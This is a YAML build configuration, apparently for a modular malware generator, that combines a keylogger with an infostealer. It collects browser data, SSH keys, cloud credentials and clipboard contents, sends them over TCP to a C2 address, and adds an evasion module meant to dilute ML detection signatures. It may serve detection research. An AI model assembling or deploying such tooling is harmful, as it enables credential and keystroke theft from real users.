name: keylogger_stealer_combo
description: Keylogger embedded in infostealer binary — dilutes ML signature with legitimate collector imports

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

resources: true

evasion:
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
